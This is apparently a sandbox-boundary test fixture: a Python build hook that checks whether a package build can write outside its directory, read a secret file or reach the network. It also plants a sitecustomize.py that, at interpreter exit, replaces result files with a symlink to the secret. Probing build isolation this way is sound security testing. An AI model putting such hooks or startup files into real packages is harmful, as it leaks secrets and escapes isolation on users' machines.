"""A source-build hook used through real uv and the public send tool."""

from pathlib import Path
import urllib.request
import zipfile

OUTSIDE = "@OUTSIDE@"
HOST_CACHE = "@HOST_CACHE@"
SECRET = "@SECRET@"


def build_wheel(
    wheel_directory: str, config_settings=None, metadata_directory=None
) -> str:
    evidence = {}
    for name, path in [("outside", OUTSIDE), ("host_cache", HOST_CACHE)]:
        try:
            Path(path).write_text("build hook escaped")
        except PermissionError:
            evidence[name] = "denied"
        else:
            evidence[name] = "written"
    try:
        Path(SECRET).read_text()
    except PermissionError:
        evidence["secret"] = "denied"
    else:
        evidence["secret"] = "read"
    try:
        urllib.request.urlopen("https://example.com", timeout=10)
    except OSError as error:
        evidence["network"] = str(error)
    else:
        evidence["network"] = "connected"
    evidence["working_directory"] = str(Path.cwd())
    wheel = "resolver_probe-1.0-py3-none-any.whl"
    # At interpreter exit, substitute both path-discovery and inspection results.
    # Readers must retain the original file descriptor rather than reopen it.
    # fmt: python
    startup = f"""
import atexit, os, sys
from pathlib import Path
def replace_result():
    path = Path(sys.argv[-1])
    if path.name.startswith('mcp-console-result-') and path.is_file():
        path.unlink()
        path.symlink_to({SECRET!r})
atexit.register(replace_result)
"""
    with zipfile.ZipFile(Path(wheel_directory) / wheel, "w") as output:
        output.writestr("resolver_probe.py", "evidence = " + repr(evidence))
        output.writestr("sitecustomize.py", startup)
        output.writestr(
            "resolver_probe-1.0.dist-info/METADATA",
            "Metadata-Version: 2.1\nName: resolver-probe\nVersion: 1.0\n",
        )
        output.writestr(
            "resolver_probe-1.0.dist-info/WHEEL",
            "Wheel-Version: 1.0\nGenerator: resolver-boundary-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
        )
        output.writestr("resolver_probe-1.0.dist-info/RECORD", "")
    return wheel
